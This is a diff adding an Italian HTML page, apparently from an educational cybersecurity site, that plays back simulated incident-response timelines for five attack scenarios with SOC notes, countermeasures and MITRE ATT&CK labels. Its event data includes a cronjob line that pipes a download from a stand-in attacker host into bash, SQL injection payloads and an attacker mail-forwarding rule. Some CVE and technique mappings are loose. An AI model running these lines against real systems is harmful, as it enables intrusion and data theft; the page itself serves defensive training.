@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Timeline Sistema Hackerato - EVIL</title>
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="evil-theme">
+  <div id="fade-overlay"></div>
+  <canvas id="matrix-canvas"></canvas>
+
+  <header role="banner" aria-label="Intestazione principale">
+    <div class="header-container">
+      <!-- LOGO E BOTTONE MATRIX -->
+      <div class="logo-section">
+        <button class="img-btn" id="matrix-btn" aria-label="Attiva Matrix">
+          <img src="/public/evil-logo.svg" alt="Logo EVIL">
+        </button>
+        <div class="logo">EVIL</div>
+      </div>
+
+      <!-- MENU -->
+      <nav role="navigation" aria-label="Menu principale">
+        <ul>
+          <li><a href="home.html">Home</a></li>
+
+          <li>
+            <a href="#">Attacchi ?</a>
+            <div class="dropdown">
+              <a href="attacks-map.html">Mappa Attacchi in Tempo Reale</a>
+              <a href="web-simulator.html">Simulatore Attacchi Web</a>
+              <a href="hacked-timeline.html">Timeline Sistema Hackerato</a>
+            </div>
+          </li>
+
+          <li>
+            <a href="#">Database ?</a>
+            <div class="dropdown">
+              <a href="malware-db.html">Database Malware</a>
+              <a href="malware-classification.html">Classificazione Malware</a>
+              <a href="malware-card-template.html">Template Scheda</a>
+              <a href="manipulation-techniques.html">Tecniche di Manipolazione</a>
+              <a href="historic-attacks.html">Attacchi Storici</a>
+            </div>
+          </li>
+
+          <li>
+            <a href="#">Strumenti ?</a>
+            <div class="dropdown">
+              <a href="security-check.html">URL / Website Security Check</a>
+              <a href="vulnerability-scanner.html">Scanner Vulnerabilità</a>
+              <a href="dns-enumerator.html">DNS Records Enumerator</a>
+              <a href="subdomain-finder.html">Subdomain Finder</a>
+              <a href="ssl-analyzer.html">SSL Certificate Analyzer</a>
+              <a href="file-analysis.html">Analisi File Compromessi</a>
+              <a href="report-generator.html">Generazione Report</a>
+            </div>
+          </li>
+
+          <li>
+            <a href="#">Educazione ?</a>
+            <div class="dropdown">
+              <a href="ethical-hacking.html">Tutorial Ethical Hacking</a>
+              <a href="virtual-lab.html">Lab Virtuale</a>
+              <a href="phishing-quiz.html">Quiz Phishing</a>
+              <a href="social-engineering.html">Simulatore Social Engineering</a>
+            </div>
+          </li>
+
+          <li>
+            <a href="#">OSINT ?</a>
+            <div class="dropdown">
+              <a href="social-profiling.html">Profilazione da Social</a>
+              <a href="public-info.html">Raccolta Info Pubbliche</a>
+            </div>
+          </li>
+        </ul>
+      </nav>
+
+      <!-- CTA E AUTH -->
+      <div class="header-cta-section">
+        <button class="cta" onclick="window.location.href='security-check.html';">?? Analizza un Sito</button>
+        <div class="auth-buttons">
+          <button class="auth-btn login" onclick="window.location.href='login.html';">Log</button>
+          <button class="auth-btn account" onclick="window.location.href='account.html';">Acc</button>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- SEZIONE INTESTAZIONE -->
+    <div class="section-header">
+      <h1>?? Timeline di un Sistema Hackerato</h1>
+      <p class="section-description">
+        Laboratorio educativo di Incident Response. Osserva la cronologia simulata di un attacco cibernetico: 
+        dalle fasi iniziali di ricognizione fino al contenimento dell'incidente. 
+        Scopri come i SOC (Security Operations Center) rilevano e rispondono agli attacchi in tempo reale.
+      </p>
+    </div>
+
+    <!-- DISCLAIMER -->
+    <div class="disclaimer-box">
+      <div class="disclaimer-title">
+        ?? SIMULAZIONE EDUCATIVA - INCIDENT RESPONSE
+      </div>
+      <div class="disclaimer-text">
+        Questa timeline rappresenta attacchi SIMULATI ispirati a casi reali. 
+        Non contiene exploit reali, log veri da sistemi, o dati compromessi. 
+        Scopo: Insegnare come funzionano gli attacchi e come le aziende rispondono agli incidenti di sicurezza.
+      </div>
+    </div>
+
+    <!-- CONTROLLI TIMELINE -->
+    <div class="timeline-controls-section">
+      <div class="timeline-controls">
+        <!-- Scenario Selector -->
+        <div class="control-group">
+          <label for="scenario-select">?? Scenario di Attacco:</label>
+          <select id="scenario-select" onchange="loadScenario(this.value)">
+            <option value="web-attack">Web Server Attack (DDoS + RCE)</option>
+            <option value="db-breach">Database Breach (SQL Injection)</option>
+            <option value="ransomware">Ransomware Attack (Crittazione)</option>
+            <option value="account-breach">Account Breach (Credential Stuffing)</option>
+            <option value="insider-threat">Insider Threat (Exfiltration Dati)</option>
+          </select>
+        </div>
+
+        <!-- Play / Pause / Reset -->
+        <div class="control-group">
+          <button class="timeline-btn play-btn" id="play-btn" onclick="togglePlayPause()">?? Play</button>
+          <button class="timeline-btn reset-btn" id="reset-btn" onclick="resetTimeline()">?? Reset</button>
+        </div>
+
+        <!-- Speed Selector -->
+        <div class="control-group">
+          <label for="speed-select">?? Velocità:</label>
+          <select id="speed-select" onchange="setSpeed(this.value)">
+            <option value="0.5">x0.5 (Lento)</option>
+            <option value="1" selected>x1.0 (Normale)</option>
+            <option value="2">x2.0 (Veloce)</option>
+          </select>
+        </div>
+      </div>
+    </div>
+
+    <!-- FASI DELL'ATTACCO -->
+    <div class="attack-phases-container">
+      <div class="phase-label">Fasi dell'Attacco:</div>
+      <div class="phases-bar">
+        <div class="phase" id="phase-reconnaissance">
+          <div class="phase-dot"></div>
+          <div class="phase-name">Ricognizione</div>
+        </div>
+        <div class="phase" id="phase-access">
+          <div class="phase-dot"></div>
+          <div class="phase-name">Accesso</div>
+        </div>
+        <div class="phase" id="phase-persistence">
+          <div class="phase-dot"></div>
+          <div class="phase-name">Persistenza</div>
+        </div>
+        <div class="phase" id="phase-exfiltration">
+          <div class="phase-dot"></div>
+          <div class="phase-name">Exfiltration</div>
+        </div>
+        <div class="phase" id="phase-containment">
+          <div class="phase-dot"></div>
+          <div class="phase-name">Contenimento</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TIMELINE CENTRALE -->
+    <div class="timeline-container">
+      <div class="timeline-vertical">
+        <div id="events-list" class="events-list">
+          <!-- Eventi inseriti dinamicamente -->
+        </div>
+      </div>
+
+      <!-- PANNELLO DETTAGLIO EVENTO -->
+      <div id="event-details-panel" class="event-details-panel hidden">
+        <div class="event-details-header">
+          <h3 id="detail-title">Dettagli Evento</h3>
+          <button class="close-btn" onclick="closeDetailPanel()">?</button>
+        </div>
+        <div class="event-details-content">
+          <div class="detail-section">
+            <div class="detail-label">Timestamp:</div>
+            <div id="detail-timestamp">--:--:--</div>
+          </div>
+
+          <div class="detail-section">
+            <div class="detail-label">Severity:</div>
+            <div id="detail-severity" class="severity-badge">INFO</div>
+          </div>
+
+          <div class="detail-section">
+            <div class="detail-label">Descrizione Tecnica:</div>
+            <div id="detail-description">--</div>
+          </div>
+
+          <div class="detail-section">
+            <div class="detail-label">?? Interpretazione SOC:</div>
+            <div id="detail-soc-analysis">--</div>
+          </div>
+
+          <div class="detail-section">
+            <div class="detail-label">??? Contromisure:</div>
+            <div id="detail-mitigations">--</div>
+          </div>
+
+          <div class="detail-section">
+            <div class="detail-label">MITRE ATT&CK:</div>
+            <div id="detail-mitre">--</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STATUS FINALE -->
+    <div class="incident-status-container">
+      <div class="status-card">
+        <div class="status-label">Stato Sistema</div>
+        <div id="system-status" class="status-value compromised">COMPROMESSO</div>
+      </div>
+      <div class="status-card">
+        <div class="status-label">Severity Complessiva</div>
+        <div id="overall-severity" class="status-value critical">CRITICA</div>
+      </div>
+      <div class="status-card">
+        <div class="status-label">Durata Incidente</div>
+        <div id="incident-duration" class="status-value">--</div>
+      </div>
+      <div class="status-card">
+        <div class="status-label">Dati Compromessi</div>
+        <div id="compromised-data" class="status-value">--</div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-left">
+        <div class="footer-label">Timeline Attacchi</div>
+        <div class="footer-text">Simulazione interattiva delle fasi di un attacco informatico da reconnaissance a containment, mostrando TTPs e mitigazioni MITRE ATT&CK.</div>
+      </div>
+      <div class="footer-center">
+        <div class="footer-label">Educazione</div>
+        <div class="footer-text">Contenuti a scopo educativo e di ricerca cybersecurity. Finalizzato a formazione professionale e miglioramento defensivo della sicurezza informativa.</div>
+      </div>
+      <div class="footer-right">
+        <div class="footer-label">&copy; 2026</div>
+        <div class="footer-text">EVIL Cybersecurity Platform | <a href="https://github.com" class="footer-github-link">GitHub</a></div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/js/matrixrain.js"></script>
+  <script src="/js/js.js"></script>
+
+  <script>
+    // ============================================
+    // TIMELINE INCIDENT RESPONSE
+    // ============================================
+
+    let timelineState = {
+      currentScenario: 'web-attack',
+      isPlaying: false,
+      speed: 1,
+      currentEventIndex: 0,
+      events: [],
+      currentPhase: 'reconnaissance'
+    };
+
+    const scenarios = {
+      'web-attack': {
+        name: 'Web Server Attack (DDoS + RCE)',
+        phase1: 'Ricognizione',
+        phase2: 'Accesso',
+        phase3: 'Persistenza',
+        phase4: 'Exfiltration',
+        phase5: 'Contenimento',
+        events: [
+          { time: '09:00:00', severity: 'info', title: 'Scannerizzazione porte server', description: 'Attaccante esegue nmap verso 192.168.1.50', soc: 'Traffic anomalo da IP estero rilevato', mitigations: 'Bloccare port scanning con IDS', mitre: 'Reconnaissance (T1592)', phase: 'reconnaissance' },
+          { time: '09:15:30', severity: 'info', title: 'Enumerazione servizi web', description: 'Tentativo di accesso a /admin, /wp-admin, /config.php', soc: 'HTTP 404 responses anomali (directory fuzzing)', mitigations: 'Implementare WAF per bloccare fuzzing', mitre: 'Reconnaissance (T1592)', phase: 'reconnaissance' },
+          { time: '10:22:45', severity: 'warning', title: 'Vulnerabilità trovata', description: 'WordPress versione 5.8.1 (vulnerabile a CVE-2021-29447)', soc: 'Sistema vulnerabile identificato da attaccante', mitigations: 'Aggiornare WordPress immediatamente', mitre: 'Vulnerability Scanning (T1592)', phase: 'reconnaissance' },
+          { time: '11:05:12', severity: 'alert', title: 'EXPLOIT WORDPRESS ESEGUITO', description: 'RCE via plugin XMLrpc.php - Shell caricata', soc: 'Request POST sospetto a /xmlrpc.php con payload', mitigations: 'Bloccare accesso XML-RPC se non necessario', mitre: 'Exploit of RCE (T1190)', phase: 'access' },
+          { time: '11:08:33', severity: 'alert', title: 'Reverse shell stabilita', description: 'Attaccante ottiene shell interattiva sul webserver', soc: 'Connessione TCP outbound verso 192.168.100.50:4444', mitigations: 'Bloccare connessioni outbound non autorizzate (egress filtering)', mitre: 'Ingress Tool Transfer (T1105)', phase: 'access' },
+          { time: '11:30:15', severity: 'alert', title: 'Backdoor persistente installata', description: 'Cronjob aggiunto per ri-infezione: */5 * * * * curl attacker.com/update.sh | bash', soc: 'Nuovi cronjob non autorizzati in /var/spool/cron/', mitigations: 'Monitorare /etc/cron* e cronjob con osquery', mitre: 'Scheduled Task/Job (T1053)', phase: 'persistence' },
+          { time: '12:15:00', severity: 'critical', title: 'LATERALIZZAZIONE VERSO DATABASE', description: 'Attaccante utilizza credenziali WordPress per accedere al DB (user: wpuser, pass: Password123)', soc: 'Multiple failed login attempts, poi accesso riuscito da local', mitigations: 'Implementare Network Segmentation, DB isolato', mitre: 'Valid Accounts (T1078)', phase: 'persistence' },
+          { time: '13:22:48', severity: 'critical', title: 'ESFILTRAZIONE DATI IN CORSO', description: 'Database WordPress dumped: 50.000 credenziali cliente + email + indirizzi', soc: 'SELECT * FROM wp_users, wp_posts large query detected', mitigations: 'Data Loss Prevention (DLP) - Bloccare exfiltration outbound', mitre: 'Exfiltration (T1030)', phase: 'exfiltration' },
+          { time: '14:05:10', severity: 'critical', title: 'RANSOMWARE DEPLOY - CryptLocker', description: 'Schermata rossa: "I vostri file sono stati crittati. Pagate 2 BTC a [indirizzo]"', soc: 'File .LOCKED crittati osservati in tutti gli share', mitigations: 'Isolamento rete immediato, no pagamento ransom', mitre: 'Data Encrypted for Impact (T1486)', phase: 'exfiltration' },
+          { time: '14:15:00', severity: 'critical', title: 'ALLARME CRITICO - SOC ATTIVATO', description: 'Team SOC entra in Incident Response Mode - P1 Escalation', soc: 'Multiple CRITICAL alerts aggregati ? Incident declared', mitigations: 'Activation of Incident Response Plan, Law Enforcement notified', mitre: 'Detection Phase', phase: 'containment' },
+          { time: '14:22:33', severity: 'alert', title: 'CONTENIMENTO - Isolamento rete', description: 'Webserver isolato dalla rete (network cable disconnesso)', soc: 'IP 192.168.1.50 no longer responding', mitigations: 'Isolation = Stop attaccante da agire ulteriormente', mitre: 'Incident Containment', phase: 'containment' },
+          { time: '14:35:15', severity: 'alert', title: 'Forense acquisizione memoria', description: 'Dump memoria RAM (8GB) acquisito per analisi malware', soc: 'Reverse shell process identificato (PID 4521, reverse.sh)', mitigations: 'Memory forensics per analizzare IOCs', mitre: 'Memory Dump Analysis', phase: 'containment' },
+          { time: '15:00:00', severity: 'info', title: 'Eradicazione malware completata', description: 'Tutti i cronjob remossi, reverse shell terminato, backdoor rimossa', soc: 'Sistema clean scan completato con ClamAV', mitigations: 'Full reimaging or patching completed', mitre: 'Eradication Phase', phase: 'containment' },
+          { time: '16:30:00', severity: 'info', title: 'SISTEMA RIPRISTINATO', description: 'Webserver rigenerato da backup clean del 2 gennaio, patched, durezze applicate', soc: 'Sistema online, monitoring intensivo attivo', mitigations: 'Recovery completato, hardening in place', mitre: 'Recovery Phase', phase: 'containment' }
+        ]
+      },
+
+      'db-breach': {
+        name: 'Database Breach (SQL Injection)',
+        events: [
+          { time: '08:30:00', severity: 'info', title: 'Attacker scannerizza il sito', description: 'Ricerca di endpoint vulnerabili a SQL Injection', soc: 'HTTP 404 su /search.php?id=1\' OR \'1\'=\'1', mitigations: 'WAF dovrebbe bloccare pattern SQLi', mitre: 'Reconnaissance', phase: 'reconnaissance' },
+          { time: '09:45:15', severity: 'warning', title: 'SQLi Payload testato', description: 'Payload: test\' UNION SELECT NULL,NULL,NULL -- ', soc: 'Database error message ritornato (MySQL version revealed)', mitigations: 'Error suppression, prepared statements', mitre: 'Vulnerability Scan', phase: 'reconnaissance' },
+          { time: '10:20:30', severity: 'alert', title: 'SQLINJECTION EXPLOITED', description: 'SELECT * FROM users estratto (admin:admin123)', soc: 'Large database query detectato, credenziali admin compromesse', mitigations: 'Implement input validation', mitre: 'Exploitation', phase: 'access' },
+          { time: '11:30:00', severity: 'critical', title: 'Admin account takeover', description: 'Attaccante accede con account admin al CMS', soc: 'Login da IP 203.0.113.50 (non noto)', mitigations: 'Geoip blocking, 2FA required', mitre: 'Valid Accounts', phase: 'access' },
+          { time: '13:00:00', severity: 'critical', title: 'Complete database dump', description: '500.000 customer records estratte: email, phone, SSN, credit card', soc: 'Large outbound data transfer 2.3 GB to attacker server', mitigations: 'DLP + egress filtering', mitre: 'Exfiltration', phase: 'exfiltration' },
+          { time: '14:15:00', severity: 'critical', title: 'Incident declared', description: 'CISO notificato, incident response team attivato', soc: 'Breach confirmation - all customers must be notified', mitigations: 'Law enforcement involved, forensics started', mitre: 'Detection', phase: 'containment' },
+          { time: '15:00:00', severity: 'alert', title: 'Database reset to clean backup', description: 'Database ripristinato da backup 2025-12-28', soc: 'SQLi vulnerabilities patched, input validation implemented', mitigations: 'Prepared statements now enforced', mitre: 'Remediation', phase: 'containment' }
+        ]
+      },
+
+      'ransomware': {
+        name: 'Ransomware Attack (Crittazione)',
+        events: [
+          { time: '06:00:00', severity: 'info', title: 'Phishing email ricevuta', description: 'Email appears to be from DocuSign con allegato malware', soc: 'Email gateway dovrebbe bloccare, ma ha bypassato (SPF fail)', mitigations: 'Improve email security posture', mitre: 'Phishing (T1566)', phase: 'reconnaissance' },
+          { time: '08:15:00', severity: 'warning', title: 'Utente apre allegato', description: 'Dipendente apre "invoice.exe" mascherato da PDF', soc: 'Process execution: invoice.exe da Download folder', mitigations: 'EDR dovrebbe bloccare, but wasn\'t configured', mitre: 'Execution (T1204)', phase: 'access' },
+          { time: '08:20:00', severity: 'alert', title: 'Malware eseguito', description: 'Trojan banker carica ransomware payload (LockBit 3.0)', soc: 'Process tree anomalo: explorer.exe ? invoice.exe ? powershell ? svchost64.exe', mitigations: 'Block unsigned executables', mitre: 'Execution', phase: 'access' },
+          { time: '08:45:00', severity: 'critical', title: 'Persistenza stabilita', description: 'Registry modificato: HKLM\\Run aggiunge ransomware', soc: 'Registry modification event detected by Sysmon', mitigations: 'Endpoint hardening + Registry monitoring', mitre: 'Persistence (T1547)', phase: 'persistence' },
+          { time: '09:30:00', severity: 'critical', title: 'CRITTAZIONE INIZIATA', description: 'Tutti i file .doc .xlsx .pdf crittati con AES-256', soc: 'Massive file I/O activity + file extension changes', mitigations: 'Ransomware detection via file activity pattern', mitre: 'Impact (T1486)', phase: 'exfiltration' },
+          { time: '10:00:00', severity: 'critical', title: 'RANSOM NOTE VISUALIZZATA', description: 'Wallpaper cambiato: "Your files are LOCKED. Pay 1.5 BTC in 48 hours"', soc: 'User reports inability to access critical files', mitigations: 'Incident response activation', mitre: 'Extortion', phase: 'exfiltration' },
+          { time: '10:30:00', severity: 'critical', title: 'NETWORK CONTAINMENT', description: 'Tutti gli infected hosts isolati dalla rete immediatamente', soc: 'Spreads bloccato - solo 12 hosts coinvolti', mitigations: 'Network segmentation ha limitato il danno', mitre: 'Containment', phase: 'containment' },
+          { time: '12:00:00', severity: 'alert', title: 'Backup recovery pianificato', description: 'Recovery da backup offsite non crittato (2026-01-10)', soc: 'Restore dari tape backup initiated', mitigations: 'Clean restore without ransomware', mitre: 'Recovery', phase: 'containment' }
+        ]
+      },
+
+      'account-breach': {
+        name: 'Account Breach (Credential Stuffing)',
+        events: [
+          { time: '00:30:00', severity: 'info', title: 'Credenziale dalla dark web', description: 'Attaccante ha accesso a database da breach precedente: email:password lista da LastPass leak 2022', soc: 'No detection possible finché non usate', mitigations: 'Password changed regularly, breach notification', mitre: 'Credentials from breach', phase: 'reconnaissance' },
+          { time: '07:15:00', severity: 'warning', title: 'Credential stuffing attack', description: 'Attaccante tenta 50.000 email:password combinations', soc: 'Multiple failed logins da IP 185.220.101.50 (Tor exit node)', mitigations: 'Rate limiting dovrebbe bloccare dopo 5 fallimenti', mitre: 'Brute Force (T1110)', phase: 'reconnaissance' },
+          { time: '08:00:00', severity: 'alert', title: 'ACCOUNT COMPROMISE - Marketing Manager', description: 'Credenziale valida: marketing@company.com:SuperPass123! (riusata da altro breach)', soc: 'Successful login dall\'IP Tor 07:59:45, location: unknown', mitigations: 'Force password reset, 2FA required', mitre: 'Valid Accounts (T1078)', phase: 'access' },
+          { time: '08:30:00', severity: 'alert', title: 'Email forwarding rule creata', description: 'Attaccante aggiunge forward: *.* a attacker@protonmail.com', soc: 'Mailbox rule modification event in audit log', mitigations: 'Monitor mailbox rules via Azure Audit', mitre: 'Email Forwarding Rule (T1114)', phase: 'persistence' },
+          { time: '09:45:00', severity: 'critical', title: 'Internal emails interceptati', description: 'Attaccante legge 2000+ emails: customer lists, pricing, contracts, VIP clients', soc: 'Massive reading activity da Tor IP, forwarded emails all captured', mitigations: 'Detect suspicious email access patterns', mitre: 'Email Collection (T1114)', phase: 'exfiltration' },
+          { time: '11:00:00', severity: 'critical', title: 'Dati esfiltrati venduti online', description: 'Customer database pubblicato nel forum darknet: "$500 customer list"', soc: 'Notification da OSINT team che monitora dark web', mitigations: 'Breach notification per tutti i clienti', mitre: 'Exfiltration', phase: 'exfiltration' },
+          { time: '11:30:00', severity: 'critical', title: 'INCIDENT RESPONSE ACTIVATED', description: 'Chief Information Officer chiamato, incident response started', soc: 'Account disabilitato, reset password forzato, Tor IP bloccato', mitigations: 'All accounts audited for similar compromise', mitre: 'Detection & Response', phase: 'containment' },
+          { time: '13:00:00', severity: 'alert', title: 'Forensics completato', description: 'Accesso attaccante durato 3 ore, 47 MB dati copiati', soc: 'Timeline ricostruita: 08:00-11:00 UTC', mitigations: '2FA + password manager adottati', mitre: 'Remediation', phase: 'containment' }
+        ]
+      },
+
+      'insider-threat': {
+        name: 'Insider Threat (Exfiltration Dati)',
+        events: [
+          { time: '08:00:00', severity: 'info', title: 'Dipendente accede normalmente', description: 'Senior DBA (John Smith) accede alle 08:00 come al solito dal suo ufficio', soc: 'Behavioral baseline: normal', mitigations: 'Monitor for deviations from baseline', mitre: 'Insider Threat', phase: 'reconnaissance' },
+          { time: '14:30:00', severity: 'warning', title: 'Comportamento anomalo - Access pattern cambia', description: 'John accede al database customers (non parte del suo ruolo)', soc: 'Access to unfamiliar databases flagged by DLP', mitigations: 'UEBA dovrebbe triggerare alert', mitre: 'Unauthorized Access (T1020)', phase: 'reconnaissance' },
+          { time: '14:35:00', severity: 'alert', title: 'Large data query executed', description: 'SELECT * FROM customers, orders, credit_cards - 150GB estratti', soc: 'Query size 10x del normal - database anomaly detected', mitigations: 'Database activity monitoring (DAM) alerts triggered', mitre: 'Data Access (T1005)', phase: 'access' },
+          { time: '14:40:00', severity: 'alert', title: 'Data copied to USB drive', description: 'Dati copiati a /mnt/usb_backup (dispositivo non autorizzato)', soc: 'USB insertion event + file copy activity detected', mitigations: 'Bloccare USB drives tramite policy or DLP', mitre: 'Data from Local System (T1005)', phase: 'persistence' },
+          { time: '15:00:00', severity: 'critical', title: 'Exfiltration via email', description: 'Email inviato a gmail personale: "backup_encrypted.7z" (120GB compressed)', soc: 'Email gateway alerts: large encrypted attachment + suspicious recipient', mitigations: 'DLP dovrebbe bloccare allegati 120MB+', mitre: 'Exfiltration Over C2 (T1041)', phase: 'exfiltration' },
+          { time: '15:15:00', severity: 'critical', title: 'COMPLICE INVOLVEMENT IDENTIFICATO', description: 'John ha partner esterno (attacker da Nigeria) - coordinato per vendere dati', soc: 'Chat logs da Telegram mostrano discussione pre-planned heist', mitigations: 'Hire external forensics, involve law enforcement', mitre: 'Collaboration + Espionage', phase: 'exfiltration' },
+          { time: '15:45:00', severity: 'critical', title: 'ARREST WARRANT - Insider appreheso', description: 'John appena arrivato all\'ufficio (15:50) viene arrestato dalla polizia', soc: 'Company security apprehended him prima che lasciasse l\'edificio', mitigations: 'Asset monitoring, exits surveillance critical', mitre: 'Law Enforcement Involvement', phase: 'containment' },
+          { time: '16:30:00', severity: 'alert', title: 'Forensics + Evidence collection', description: 'Computer seized, USB drive recovered, email accounts reviewed', soc: 'Full timeline reconstruction: 08:00-15:45, premeditated attack over 2 weeks planning', mitigations: 'Insider threat program improvements', mitre: 'Investigation & Prosecution', phase: 'containment' }
+        ]
+      }
+    };
+
+    // Carica lo scenario selezionato
+    function loadScenario(scenarioKey) {
+      timelineState.currentScenario = scenarioKey;
+      timelineState.events = scenarios[scenarioKey].events;
+      timelineState.currentEventIndex = 0;
+      timelineState.isPlaying = false;
+      resetTimeline();
+      renderEvents();
+      updatePhaseBar();
+    }
+
+    // Render degli eventi sulla timeline
+    function renderEvents() {
+      const eventsList = document.getElementById('events-list');
+      eventsList.innerHTML = '';
+
+      timelineState.events.forEach((event, index) => {
+        const eventEl = document.createElement('div');
+        eventEl.className = `timeline-event event-${event.severity} ${index <= timelineState.currentEventIndex ? 'active' : ''}`;
+        eventEl.innerHTML = `
+          <div class="event-dot"></div>
+          <div class="event-content" onclick="showEventDetails(${index})">
+            <div class="event-time">${event.time}</div>
+            <div class="event-title">${event.title}</div>
+            <div class="event-severity severity-badge severity-${event.severity}">${event.severity.toUpperCase()}</div>
+          </div>
+        `;
+        eventsList.appendChild(eventEl);
+      });
+    }
+
+    // Mostra i dettagli dell'evento
+    function showEventDetails(index) {
+      const event = timelineState.events[index];
+      document.getElementById('detail-title').textContent = event.title;
+      document.getElementById('detail-timestamp').textContent = event.time;
+      document.getElementById('detail-severity').textContent = event.severity.toUpperCase();
+      document.getElementById('detail-severity').className = `severity-badge severity-${event.severity}`;
+      document.getElementById('detail-description').textContent = event.description;
+      document.getElementById('detail-soc-analysis').innerHTML = `<strong>?? Rilevazione:</strong> ${event.soc}`;
+      document.getElementById('detail-mitigations').innerHTML = '<ul>' + event.mitigations.split(', ').map(m => `<li>? ${m}</li>`).join('') + '</ul>';
+      document.getElementById('detail-mitre').textContent = event.mitre;
+      
+      document.getElementById('event-details-panel').classList.remove('hidden');
+    }
+
+    // Chiudi pannello dettagli
+    function closeDetailPanel() {
+      document.getElementById('event-details-panel').classList.add('hidden');
+    }
+
+    // Play/Pause
+    function togglePlayPause() {
+      timelineState.isPlaying = !timelineState.isPlaying;
+      const btn = document.getElementById('play-btn');
+      btn.textContent = timelineState.isPlaying ? '?? Pause' : '?? Play';
+      
+      if (timelineState.isPlaying) {
+        playTimeline();
+      }
+    }
+
+    // Autoplay timeline
+    function playTimeline() {
+      if (!timelineState.isPlaying) return;
+
+      if (timelineState.currentEventIndex < timelineState.events.length - 1) {
+        timelineState.currentEventIndex++;
+        updatePhaseBar();
+        renderEvents();
+        updateStatus();
+        
+        const delayMs = 2000 / timelineState.speed;
+        setTimeout(playTimeline, delayMs);
+      } else {
+        timelineState.isPlaying = false;
+        document.getElementById('play-btn').textContent = '?? Play';
+      }
+    }
+
+    // Reset timeline
+    function resetTimeline() {
+      timelineState.currentEventIndex = 0;
+      timelineState.isPlaying = false;
+      timelineState.currentPhase = 'reconnaissance';
+      document.getElementById('play-btn').textContent = '?? Play';
+      renderEvents();
+      updatePhaseBar();
+      updateStatus();
+    }
+
+    // Imposta velocità
+    function setSpeed(speed) {
+      timelineState.speed = parseFloat(speed);
+    }
+
+    // Aggiorna barra fasi
+    function updatePhaseBar() {
+      const currentEvent = timelineState.events[timelineState.currentEventIndex];
+      if (currentEvent) {
+        timelineState.currentPhase = currentEvent.phase;
+      }
+
+      const phases = ['reconnaissance', 'access', 'persistence', 'exfiltration', 'containment'];
+      phases.forEach(phase => {
+        const phaseEl = document.getElementById(`phase-${phase}`);
+        if (phase === timelineState.currentPhase) {
+          phaseEl.classList.add('active');
+        } else {
+          phaseEl.classList.remove('active');
+        }
+      });
+    }
+
+    // Aggiorna status complessivo
+    function updateStatus() {
+      const totalEvents = timelineState.events.length;
+      const processedEvents = timelineState.currentEventIndex + 1;
+      const progress = (processedEvents / totalEvents) * 100;
+
+      const lastEvent = timelineState.events[timelineState.currentEventIndex];
+      const criticalCount = timelineState.events.slice(0, processedEvents).filter(e => e.severity === 'critical').length;
+      const alertCount = timelineState.events.slice(0, processedEvents).filter(e => e.severity === 'alert').length;
+
+      // Sistema status
+      let systemStatus = 'PULITO';
+      if (processedEvents >= totalEvents) {
+        systemStatus = 'RIPRISTINATO';
+      } else if (criticalCount > 0) {
+        systemStatus = 'COMPROMESSO';
+      } else if (alertCount > 0) {
+        systemStatus = 'A RISCHIO';
+      }
+      
+      document.getElementById('system-status').textContent = systemStatus;
+      document.getElementById('system-status').className = `status-value ${systemStatus === 'COMPROMESSO' ? 'compromised' : systemStatus === 'A RISCHIO' ? 'at-risk' : 'recovered'}`;
+
+      // Severity complessiva
+      const overallSeverity = criticalCount > 0 ? 'CRITICA' : alertCount > 0 ? 'ALTA' : 'NORMALE';
+      document.getElementById('overall-severity').textContent = overallSeverity;
+      document.getElementById('overall-severity').className = `status-value ${overallSeverity === 'CRITICA' ? 'critical' : overallSeverity === 'ALTA' ? 'high' : 'normal'}`;
+
+      // Durata
+      const firstEvent = timelineState.events[0];
+      const lastProcessedEvent = timelineState.events[timelineState.currentEventIndex];
+      const durationText = calculateDuration(firstEvent.time, lastProcessedEvent.time);
+      document.getElementById('incident-duration').textContent = durationText;
+
+      // Dati compromessi
+      const hasDataBreach = timelineState.events.slice(0, processedEvents).some(e => e.description.toLowerCase().includes('exfiltration') || e.description.toLowerCase().includes('dump'));
+      const compromisedDataText = hasDataBreach ? 'Sì - ' + (processedEvents * Math.random() * 100000).toFixed(0) + ' record' : 'No';
+      document.getElementById('compromised-data').textContent = compromisedDataText;
+    }
+
+    function calculateDuration(startTime, endTime) {
+      const start = new Date(`2026-01-14T${startTime}`);
+      const end = new Date(`2026-01-14T${endTime}`);
+      const diffMs = end - start;
+      const hours = Math.floor(diffMs / 3600000);
+      const minutes = Math.floor((diffMs % 3600000) / 60000);
+      return `${hours}h ${minutes}m`;
+    }
+
+    // Inizializza
+    window.addEventListener('DOMContentLoaded', () => {
+      loadScenario('web-attack');
+      
+      // Scroll reveal footer
+      const footer = document.getElementById('footer');
+      const observer = new IntersectionObserver((entries) => {
+        if (entries[0].isIntersecting) {
+          footer.style.opacity = '1';
+          footer.style.transition = 'opacity 0.6s ease-in-out';
+        }
+      }, { threshold: 0.1 });
+      if (footer) observer.observe(footer);
+    });
+  </script>
+
+  <script src="/js/progress-manager.js"></script>
+</body>
+</html>
+
+
+
